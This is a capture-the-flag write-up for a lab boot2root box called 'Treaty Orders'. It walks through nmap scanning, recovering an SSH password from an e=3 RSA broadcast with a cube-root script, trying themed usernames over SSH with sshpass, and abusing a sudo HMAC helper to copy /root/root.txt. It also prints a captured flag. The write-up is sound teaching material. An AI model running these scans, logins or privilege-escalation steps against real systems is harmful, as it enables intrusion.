<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Treaty+Orders" alt="Typing SVG" /></a>

</div>

# Treaty Orders — PWN · JID-Pwn401 · Level 8 · 🟣 INSANE

- **Status:** 🟠 PARTIAL (2/4) — Flags 1 & 2 submitted; Flag 3 captured but time ran out before submitting; Flag 4 method confirmed, never executed. Chain solved technically, only the submission window closed.
- **Points:** — / — (per-flag points not recorded)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (flags 1–2 plaintext, 3–4 `CTF{...}`)
- **Target:** `10.10.10.41` (lab, over VPN, `10.10.10.0/24`)
- **Prompt:** *boot2root — the "Treaty keys" Python app on `:8484`; entry vector is RSA, then Linux privesc*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2200,8484` | ✅ submitted |
| 2 | Low privilege user | `delegate` | ✅ submitted |
| 3 | User flag | `CTF{4cdd7bd8d2f92d5ea23660d982399afa}` | 🟡 captured, not submitted (time) |
| 4 | Root flag | (not captured — method confirmed) | ❌ not submitted |

---

## TL;DR

1. `/board` on `:8484` broadcasts the same `e=3` ciphertext under three moduli; the three `c` are identical, so `m^3 < n` and the plaintext is the integer cube root → SSH password `quorum-5`.
2. The password + a short themed username list gives the low-priv user `delegate`; `~/sealed` (root:root, 0644) already holds the user flag.
3. Root is a `sudo NOPASSWD seal.py` whose HMAC key/body/MAC all live in `delegate`'s home (the setup even ships a valid MAC), so triggering it copies `/root/root.txt` into `~/sealed` — confirmed but not executed before time ran out.

## Recon

Full TCP + service scan (same methodology as the other Level 8 pwns):

```bash
nmap -sS -p- --min-rate 5000 -T4 --max-retries 2 -Pn -n 10.10.10.41
nmap -sC -sV -p 2200,8484 -Pn -n 10.10.10.41
```

```
2200/tcp open  ssh   OpenSSH 9.2p1 Debian 2+deb12u10
8484/tcp open  http  BaseHTTPServer 0.6 (Python 3.11.2)  title: "Treaty keys"
```

SSH host key `af:3d:7b:b7:93:80:aa:55:...` is **shared across the whole lab image** (identical to 10.10.10.44 "Command post") → SSH 2200 is a decoy. The attack surface is the Python web service on 8484.

**Flag 1:** `2200,8484`

## Entry vector — RSA broadcast (Håstad, e=3)

The index page points to `/board`:

> "Three stations encrypted the same order with **e=3**. See /board."

`/board` returns three `(n, c)` pairs — but the **three ciphertexts are identical**:

```
n1 364189980...258285279
n2 676181387...809975957
n3 839492925...924980073
c  203674902...656576   (same for all three)
```

Identical `c` across different moduli means `m^3` never wrapped any modulus (`m^3 < n_i`), so the usual CRT step is unnecessary — the plaintext is just the **integer cube root** of `c`:

```python
# solve.py
def icbrt(n):
    x = 1 << ((n.bit_length() + 2)//3 + 1)
    while True:
        y = (2*x + n//(x*x))//3
        if y >= x: return x
        x = y

c = 20367490240561972735595702852095121766721734685010856076181864963972849449057117444715667682768911876290664334691886656576
m = icbrt(c)
assert m**3 == c
print(bytes.fromhex(format(m,'x')))   # b'PASS:quorum-5:END'
```

Recovered secret: **`quorum-5`** (an SSH password).

## Foothold — Flag 2

The flag asks for the *username*, not the password. Recover it by authenticating on SSH 2200 with the known password against a small set of themed usernames (known credential, not brute force):

```bash
for u in quorum treaty station order envoy delegate clerk keeper; do
  sshpass -p 'quorum-5' ssh -p 2200 -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password ${u}@10.10.10.41 'id' 2>/dev/null
done
# delegate -> uid=1000(delegate) gid=1000(delegate)
```

**Flag 2:** `delegate`

## User flag — Flag 3

`delegate`'s home holds a root-owned, world-readable `sealed` file pre-seeded by the challenge setup:

```
~/sealed      -> CTF{4cdd7bd8d2f92d5ea23660d982399afa}   (root:root, 0644)
~/.pass       -> quorum-5                                 (0600)
~/petition    -> PROMOTE
~/petition.mac-> 7bf1d0e19a0618949146764febd1e893607b9167d55eca5179434df3cca070c3
```

**Flag 3:** `CTF{4cdd7bd8d2f92d5ea23660d982399afa}` (current `sealed` content; the privesc below overwrites it).

## Root — Flag 4

`sudo -l` for `delegate`:

```
(root) NOPASSWD: /usr/bin/python3 /opt/treaty/seal.py
```

`/opt/treaty/seal.py`:

```python
import hmac, hashlib, os
key  = open("/home/delegate/.pass").read().strip().encode()
body = open("/home/delegate/petition").read()
mac  = open("/home/delegate/petition.mac").read().strip()
good = hmac.new(key, body.encode(), hashlib.sha256).hexdigest()
if hmac.compare_digest(mac, good) and body.strip() == "PROMOTE":
    open("/home/delegate/sealed", "w").write(open("/root/root.txt").read())
    os.chmod("/home/delegate/sealed", 0o644)
    print("sealed")
else:
    print("rejected")
```

**Vulnerability:** the HMAC key (`.pass`), the body (`petition`) and the MAC (`petition.mac`) are all in `delegate`'s own home — fully attacker-controlled. The attacker simply makes `body == "PROMOTE"` and writes the matching HMAC, then runs the sudo script as root, which copies `/root/root.txt` into a world-readable file. The setup already shipped a valid MAC (verified locally: `hmac_sha256("quorum-5","PROMOTE") == 7bf1d0e1...`), so no forging was even required.

Exploit:

```bash
# (if needed) forge the MAC — delegate owns all three files:
printf PROMOTE > ~/petition
python3 -c 'import hmac,hashlib;open("/home/delegate/petition.mac","w").write(hmac.new(open("/home/delegate/.pass").read().strip().encode(),b"PROMOTE",hashlib.sha256).hexdigest())'
# trigger:
sudo /usr/bin/python3 /opt/treaty/seal.py
cat ~/sealed      # -> root flag
```

**Flag 4:** not captured — the submission/time window closed before running the final `sudo`. The mechanism is confirmed and deterministic.

## Lessons

- Identical ciphertexts under "broadcast e=3" is the tell that `m^3 < n` — skip CRT, take the cube root.
- A sudo helper that reads its HMAC key, message and MAC from a location the caller controls provides **zero** integrity — it is a plain `cat /root/root.txt` as root.
